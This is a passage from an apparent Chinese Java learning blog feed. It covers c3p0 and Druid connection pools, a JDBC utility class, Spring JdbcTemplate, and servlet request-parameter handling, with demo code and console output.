class="function"><span class="title">jdbcUrl</span> -&gt;</span> <span class="function"><span class="title">jdbc</span>:mysql://localhost:3306/db?useSSL=<span class="literal">false</span>&amp;serverTimezone=Hongkong&amp;characterEncoding=utf-8&amp;autoReconnect=<span class="literal">true</span>, maxAdministrativeTaskTime -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">maxConnectionAge</span> -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">maxIdleTime</span> -&gt;</span> <span class="number">30</span>, <span class="function"><span class="title">maxIdleTimeExcessConnections</span> -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">maxPoolSize</span> -&gt;</span> <span class="number">100</span>, <span class="function"><span class="title">maxStatements</span> -&gt;</span> <span class="number">200</span>, <span class="function"><span class="title">maxStatementsPerConnection</span> -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">minPoolSize</span> -&gt;</span> <span class="number">10</span>, <span class="function"><span class="title">numHelperThreads</span> -&gt;</span> <span class="number">3</span>, <span class="function"><span class="title">preferredTestQuery</span> -&gt;</span> <span class="function"><span class="title">null</span>, privilegeSpawnedThreads -&gt;</span> <span class="function"><span class="title">false</span>, properties -&gt;</span> &#123;<span class="function"><span class="title">user</span>=******, password=******&#125;, propertyCycle -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">statementCacheNumDeferredCloseThreads</span> -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">testConnectionOnCheckin</span> -&gt;</span> <span class="function"><span class="title">false</span>, testConnectionOnCheckout -&gt;</span> <span class="function"><span class="title">false</span>, unreturnedConnectionTimeout -&gt;</span> <span class="number">0</span>, <span class="function"><span class="title">userOverrides</span> -&gt;</span> &#123;&#125;, <span class="function"><span class="title">usesTraditionalReflectiveProxies</span> -&gt;</span> <span class="literal">false</span> ]</span><br><span class="line">com.mchange.v2.c3p0.impl.NewProxyConnection@<span class="number">224</span>aed64 [wrapping: com.mysql.cj.jdbc.ConnectionImpl@bff90cc]</span><br></pre></td></tr></table></figure><br>前面的都是日志信息</p>
<p>10个对象获取<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws SQLException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取DataSource</span></span><br><span class="line">        DataSource ds= <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line">        <span class="comment">//2.获取连接</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">            Connection conn = ds.getConnection();</span><br><span class="line">            System.out.<span class="built_in">println</span>(i+<span class="string">":"</span>+conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到hash值都不一样，证明是10个不同的对象</p>
<p>当配置文件最大对象数为10时<br>如果设置11个对象，就会出现报错<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws SQLException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取DataSource</span></span><br><span class="line">        DataSource ds= <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line">        <span class="comment">//2.获取连接</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">11</span>;i++)&#123;</span><br><span class="line">            Connection conn = ds.getConnection();</span><br><span class="line">            System.out.<span class="built_in">println</span>(i+<span class="string">":"</span>+conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">"main"</span> java.sql.SQLException: An attempt by a<span class="built_in"> client </span><span class="keyword">to</span> checkout a<span class="built_in"> Connection </span>has timed out.</span><br></pre></td></tr></table></figure></p>
<p>如果想要第11个对象访问，就需要在1-10对象之间，任意归还一个到连接池中<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws SQLException </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取DataSource</span></span><br><span class="line">        DataSource ds= <span class="keyword">new</span> ComboPooledDataSource();</span><br><span class="line">        <span class="comment">//2.获取连接</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">11</span>;i++)&#123;</span><br><span class="line">            Connection conn = ds.getConnection();</span><br><span class="line">            System.out.<span class="built_in">println</span>(i+<span class="string">":"</span>+conn);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i==<span class="number">5</span>)&#123;</span><br><span class="line">                conn.<span class="built_in">close</span>();<span class="comment">//归还连接到连接池中</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这也就不会报错了，但是可以看到第5个和第6个的hash值时相同的，也就意味着应用的是同一个资源</p>
<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><ul>
<li><p>步骤：</p>
<ol>
<li><p>导入jar包 druid-1.1.23 jar</p>
</li>
<li><p>定义配置文件：</p>
<ul>
<li><p>是properties形式的</p>
</li>
<li><p>可以叫任意名称，可以放在任意目录下</p>
</li>
</ul>
</li>
<li><p>加载配置文件，Properties</p>
</li>
<li><p>获取数据库连接池对象：通过工厂类来获取的 DruidDataSourceFactory</p>
</li>
<li><p>获取连接：getConnection</p>
</li>
</ol>
</li>
</ul>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.druid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="type">String</span>[] args) <span class="keyword">throws</span> <span class="type">Exception</span> &#123;</span><br><span class="line">        <span class="comment">//1.导入jar包</span></span><br><span class="line">        <span class="comment">//2.定义配置文件</span></span><br><span class="line">        <span class="comment">//3.加载配置文件</span></span><br><span class="line">        <span class="type">Properties</span> pro = new <span class="type">Properties</span>();</span><br><span class="line">        pro.load(new <span class="type">FileReader</span>(<span class="string">"src/main/resources/druid.properties"</span>));</span><br><span class="line">        <span class="comment">//4.获取连接池对象</span></span><br><span class="line">        <span class="type">DataSource</span> ds = <span class="type">DruidDataSourceFactory</span>.createDataSource(pro);</span><br><span class="line">        <span class="comment">//5.获取连接</span></span><br><span class="line">        <span class="type">Connection</span> conn=ds.getConnection();</span><br><span class="line">        <span class="type">System</span>.out.<span class="built_in">println</span>(conn);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">七月 <span class="number">28</span>, <span class="number">2020</span> <span class="number">4</span>:<span class="number">47</span>:<span class="number">41</span> 下午 com.alibaba.druid.pool.DruidDataSource info</span><br><span class="line">信息: &#123;dataSource<span class="number">-1</span>&#125; inited</span><br><span class="line">com.mysql.cj.jdbc.<span class="symbol">ConnectionImpl@</span><span class="number">3</span>a82f6ef</span><br></pre></td></tr></table></figure></p>
<h3 id="工具类-1"><a href="#工具类-1" class="headerlink" title="工具类"></a>工具类</h3><ul>
<li><p>定义工具类</p>
<ol>
<li><p>定义一个类 JDBCUtils</p>
</li>
<li><p>提供静态代码块加载配置文件，初始化连接池对象</p>
</li>
<li><p>提供方法</p>
<ol>
<li>获取连接方法：通过数据库连接池获取连接</li>
<li><p>释放资源</p>
</li>
<li><p>获取连接池的方法</p>
</li>
</ol>
</li>
</ol>
</li>
</ul>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.until;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Druid连接池的工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtils2</span> &#123;</span></span><br><span class="line">    <span class="comment">//1.定义一个成员变量 DataSource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource ds;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.加载配置文件</span></span><br><span class="line">            Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">            pro.load(JDBCUtils2.class.getClassLoader().getResourceAsStream(<span class="string">"druid.properties"</span>));</span><br><span class="line">            <span class="comment">//2.获取DataSource</span></span><br><span class="line">            ds= DruidDataSourceFactory.createDataSource(pro);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> throws SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Statement stmt,Connection conn)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stmt!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(ResultSet rs, Statement stmt, Connection conn)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(rs!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(stmt!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn!=null)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.<span class="built_in">close</span>();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接池方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataSource <span class="title">getDataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ds;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.druid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdbc.<span class="keyword">until</span>.JDBCUtils2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.<span class="keyword">Connection</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.<span class="keyword">sql</span>.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> demo2 &#123;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 完成添加操作,给account表添加一条记录</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">Connection</span> conn=<span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement pstmt=<span class="keyword">null</span>;</span><br><span class="line">        try &#123;</span><br><span class="line">            //<span class="number">1.</span>获取连接</span><br><span class="line">            conn = JDBCUtils2.getConnection();</span><br><span class="line">            //<span class="number">2.</span>定义<span class="keyword">sql</span></span><br><span class="line">            String <span class="keyword">sql</span>="insert into account values(?,?,?)";</span><br><span class="line">            //<span class="number">3.</span>获取pstmt对象</span><br><span class="line">            pstmt = conn.prepareStatement(<span class="keyword">sql</span>);</span><br><span class="line">            //<span class="number">4.</span>给?赋值</span><br><span class="line">            pstmt.setInt(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">            pstmt.setString(<span class="number">2</span>,"wangwu");</span><br><span class="line">            pstmt.setDouble(<span class="number">3</span>,<span class="number">3000</span>);</span><br><span class="line">            //<span class="number">5.</span>执行<span class="keyword">SQL</span></span><br><span class="line">            <span class="type">int</span> count = pstmt.executeUpdate();</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(count);</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            JDBCUtils2.<span class="keyword">close</span>(pstmt,conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">七月 <span class="number">28</span>, <span class="number">2020</span> <span class="number">5</span>:<span class="number">12</span>:<span class="number">41</span> 下午 com.alibaba.druid.pool.DruidDataSource info</span><br><span class="line">信息: &#123;dataSource<span class="number">-1</span>&#125; inited</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/7-28学习日记/4.png" alt="avatar"></p>
<h2 id="Spring-JDBC"><a href="#Spring-JDBC" class="headerlink" title="Spring JDBC"></a>Spring JDBC</h2><ul>
<li><p>Spring框架对JDBC简单封装，提供了一个JDBCTemplate对象简化JDBC的开发</p>
</li>
<li><p>步骤</p>
<ol>
<li><p>导入jar包</p>
</li>
<li><p>创建JDBCTemplate对象。依赖于数据源DataSource</p>
<ul>
<li>JdbcTemplate template = new JdbcTemplate(ds)</li>
</ul>
</li>
<li><p>调用方法来JdbcTemplate的方法来完成CRUD的操作</p>
<ul>
<li><p>update()执行DML语句。增删改语句</p>
</li>
<li><p>queryForMap() 查询结果将结果集封装为map集合</p>
</li>
<li><p>queryForList() 查询结果将结果集封装为list集合</p>
</li>
<li><p>query() 查询结果，将结果封装为JavaBean对象</p>
</li>
<li><p>queryForObject 查询结果，将结果封装为对象</p>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package jdbc.datasource.jdbctemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdbc.until.JDBCUtils2;</span><br><span class="line"><span class="keyword">import</span> org.springframework.dao.DataAccessException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JdbcTemplate入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.导入jar包</span></span><br><span class="line">        <span class="comment">//2.创建JDBCTemplate对象</span></span><br><span class="line">        JdbcTemplate <span class="keyword">template</span>=<span class="keyword">new</span> JdbcTemplate(JDBCUtils2.getDataSource());</span><br><span class="line">        <span class="comment">//3.调用方法</span></span><br><span class="line">        <span class="keyword">String</span> sql=<span class="string">"update account set balance=5000 where id = ?"</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> count = <span class="keyword">template</span>.update(sql,<span class="number">3</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(count);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (DataAccessException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">七月 <span class="number">28</span>, <span class="number">2020</span> <span class="number">5</span>:<span class="number">59</span>:<span class="number">48</span> 下午 com.alibaba.druid.support.logging.JakartaCommonsLoggingImpl info</span><br><span class="line">信息: &#123;dataSource<span class="number">-1</span>&#125; inited</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/JavaWeb/7-28学习日记/5.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/7/27-Request-2</title>
    <url>/2020/07/27/JavaWeb-2020-7-27-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h1><h2 id="获取请求参数通用方式"><a href="#获取请求参数通用方式" class="headerlink" title="获取请求参数通用方式"></a>获取请求参数通用方式</h2><ol>
<li><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span> getParameter(<span class="keyword">String</span> <span class="keyword">name</span>)</span><br></pre></td></tr></table></figure>
<p>根据参数名称获取参数值</p>
</li>
<li><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">String</span>[] getParameterValues(<span class="keyword">String</span> <span class="keyword">name</span>)</span><br></pre></td></tr></table></figure>
<p>根据参数名称获取参数值的数组<br>hobby=xx&amp;hobby=game，多用于复选框</p>
</li>
<li><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">Enumeration</span>&lt;<span class="variable">String</span>&gt; <span class="function"><span class="title">getParameterNames</span>()</span></span><br></pre></td></tr></table></figure>
<p>获取所有请求的参数名称</p>
</li>
<li><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>,<span class="built_in">String</span>[]&gt; getParameterMap()</span><br></pre></td></tr></table></figure>
<p>获取所有请求的键值对集合</p>
</li>
</ol>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><h4 id="getParameter"><a href="#getParameter" class="headerlink" title="getParameter"></a>getParameter</h4><p>创建一个regist2.html<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/hello/request6"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注册"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>再创建RequestDemo6<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo6"</span>,urlPatterns = <span class="string">"/request6"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo6</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//post获取请求参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据参数名称获取参数值</span></span><br><span class="line">        <span class="type">String</span> username = request.getParameter(<span class="string">"username"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"post"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"username"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//get获取请求参数</span></span><br><span class="line">        <span class="type">String</span> username = request.getParameter(<span class="string">"username"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"get"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"username"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先在html的method为POST请求时，测试一下，打开提交表单，得到反馈<br>运行结果<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">post</span></span><br><span class="line"><span class="attribute">username</span></span><br></pre></td></tr></table></figure><br>再把method改为GET请求<br>运行结果<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">get</span><br><span class="line">username</span><br></pre></td></tr></table></figure><br>这样就可以看到<code>getParameter</code>是通用的操作<br>无论是get还是post都可以使用</p>
<p>这种写法其实比较麻烦，所以可以将RequestDemon6改为<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo6"</span>,urlPatterns = <span class="string">"/request6"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo6</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//post获取请求参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据参数名称获取参数值</span></span><br><span class="line">        <span class="type">String</span> username = request.getParameter(<span 